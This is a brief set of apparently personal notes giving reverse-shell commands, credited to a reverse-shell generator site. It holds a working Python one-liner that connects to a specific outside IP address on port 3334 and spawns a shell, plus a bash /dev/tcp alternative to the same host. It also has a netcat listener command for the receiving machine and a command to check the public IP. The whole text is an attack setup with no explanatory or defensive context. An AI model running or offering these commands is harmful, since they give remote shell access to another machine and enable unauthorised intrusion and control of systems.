# https://www.revshells.com/

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("34.126.113.105",3334));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
# or
# bash -c 'bash -i >& /dev/tcp/34.126.113.105/3334 0>&1' #

# on my machine run:
# nc -lvnp 3334

# check current ip
# curl ifconfig.me